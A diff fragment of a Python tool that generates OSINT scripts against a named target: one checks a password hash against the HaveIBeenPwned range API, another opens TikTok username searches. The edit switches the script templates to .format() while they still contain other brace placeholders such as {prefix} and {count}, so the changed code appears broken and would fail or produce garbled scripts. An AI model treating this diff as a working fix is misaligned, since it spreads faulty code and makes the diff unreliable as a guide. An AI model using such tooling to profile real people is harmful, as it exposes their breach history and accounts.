-print(f"[*] Checking breaches for: {{target}}")
+print(f"[*] Checking breaches for: {target}")
 
 # Check if it's email or username
 if '@' in target:
@@ -1522,7 +1537,7 @@ if '@' in target:
     prefix = sha1_hash[:5]
     
     try:
-        hibp_url = f"https://api.pwnedpasswords.com/range/{{prefix}}"
+        hibp_url = f"https://api.pwnedpasswords.com/range/{prefix}"
         response = requests.get(hibp_url, timeout=10)
         
         if response.status_code == 200:
@@ -1531,7 +1546,7 @@ if '@' in target:
             for h in hashes:
                 if h.startswith(sha1_hash[5:]):
                     count = h.split(':')[1].strip()
-                    print(f"[!] BREACHED: Found in {{count}} data breaches!")
+                    print(f"[!] BREACHED: Found in {count} data breaches!")
                     found = True
                     break
             
@@ -1555,6 +1570,7 @@ print(f"\\n[*] Scan completed")
 '''
         
         filename = f"osint_breach_{target}.py"
+        osint_script = osint_script.format(target=target)
     
     else:
         print(colored("[ERROR] Invalid choice!", 'red'))
@@ -3463,9 +3479,9 @@ elif choice == "2":
         print(f"   • Other socials: Check bio description")
         
         # Generate search script
-        script_content = '''import webbrowser, time
+        script_content = """import webbrowser, time
 
-username = "''' + username + '''"
+username = "{username}"
 
 print(f"Searching for {username}...")
 
@@ -3486,7 +3502,7 @@ print("\\nSearch complete!")
         
         filename = f"tiktok_search_{username}.py"
         with open(filename, 'w') as f:
-            f.write(script_content)
+            f.write(script_content.format(username=username))
         
         print(f"\\n[+] Search script saved: {filename}")
         print(f"   Run: python3 {filename}")
